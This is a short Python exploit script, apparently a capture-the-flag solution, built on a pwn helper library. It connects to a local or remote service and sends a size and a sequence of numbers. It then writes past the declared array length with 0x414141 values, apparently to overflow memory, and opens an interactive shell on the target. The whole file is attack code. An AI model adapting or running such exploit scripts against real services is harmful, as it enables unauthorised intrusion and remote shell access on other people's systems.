#!/usr/bin/env python
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.139','port':8080}, \
                        remote  = {'host':'target.com','port':4296})
env.select('local')

#==========
def attack(cmn):
    cmn.set_show('RAW')

    cmn.read_until('size: ')
    cmn.sendln('256')

    cmn.read_until('numbers: ')
    for i in range(256):
        cmn.sendln(str(i))
    raw_input('>>')
    cmn.sendln('260')
    raw_input('>>')
    for i in range(4):
        cmn.sendln(str(0x414141))

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
